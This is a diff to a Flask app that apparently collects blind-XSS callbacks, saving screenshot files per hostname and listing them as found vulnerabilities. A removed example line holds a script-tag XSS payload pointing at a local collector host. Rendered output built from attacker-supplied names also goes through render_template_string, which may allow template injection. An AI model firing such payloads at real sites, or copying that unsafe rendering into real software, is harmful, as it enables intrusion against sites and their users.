@@ -114,13 +114,32 @@ def index():
     
 @app.route("/results")
 def found_vulns_page():
-    found_vulns = [
-        Vulnerability('https://example.com', '#example', '/example'),
-        Vulnerability('https://github.com', '#example', '/example'),
-    ]
+    # Directory containing the trigger files
+    triggers_folder = "static/Triggers"
+
+    # List to hold Vulnerability objects
+    found_vulns = []
+
+    # Process each file in the Triggers folder
+    for filename in os.listdir(triggers_folder):
+        if filename.endswith(('.png', '.jpg', '.jpeg', '.gif')):  # Check for image files
+            # Remove '_n' suffix from filename if it exists
+            last_underscore_index = filename.rfind('_')
+
+            # Keep everything before the last underscore
+            processed_name = filename[:last_underscore_index] if last_underscore_index != -1 else filename
+
+            # Construct the URL using Flask's url_for
+            file_url = url_for('static', filename=f'/Triggers/{filename}')
+            found_vulns.append(Vulnerability(file_url, '#example', processed_name))
+
+    # Render the template with the found_vulns data
     content = render_template('results-view.html', found_vulns=found_vulns)
+
+    # Read the header.html content
     with open('templates/header.html', 'r') as file:
         header = file.read()
+
     return render_template_string(header + content)
 
 @app.route("/handle-vuln-data", methods=['POST'])
@@ -163,11 +182,11 @@ def handle_callback():
     url = extract_hostname(url)
     print(url)
     # Generate the next incremented filename
-    existing_files = os.listdir('./Triggers')
+    existing_files = os.listdir('./static/Triggers')
     png_files = [f for f in existing_files if f.endswith('.png')]
     next_index = len(png_files) + 1
-    new_filename = f"{url}{next_index}.png"
-    save_path = os.path.join('./Triggers', new_filename)
+    new_filename = f"{url}_{next_index}.png"
+    save_path = os.path.join('./static/Triggers', new_filename)
     
     # Save the file as a .png
     file.save(save_path)
@@ -189,11 +208,8 @@ def extract_hostname(url):
     # Extract and return the hostname
     return url[start_index:end_index]
 
-# Example usage
-url = "https://xss-game.appspot.com/level1/frame?query=%3Cscript+src%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%22%3E%3C%2Fscript%3E"
-hostname = extract_hostname(url)
 
-print(f"Hostname: {hostname}")
+
 
 def send_request():
     r = requests.get("https://example.com/")
